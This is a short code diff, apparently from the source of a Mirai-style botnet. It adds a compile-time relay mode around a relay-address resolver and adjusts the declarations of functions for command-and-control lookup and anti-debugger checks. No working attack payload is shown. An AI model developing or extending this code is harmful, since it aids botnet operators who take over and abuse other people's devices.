@@ -39,6 +39,7 @@
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
+#ifdef RELAY_MODE
 static void resolve_relay_addr(void)
 {
     srv_addr.sin_family = AF_INET;
@@ -96,8 +97,9 @@ static void resolve_relay_addr(void)
             resolv_entries_free(entries);
     }
 }
+#endif
 
-static void teardown_connection(void)
+static void teardown_connection(void);
 static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
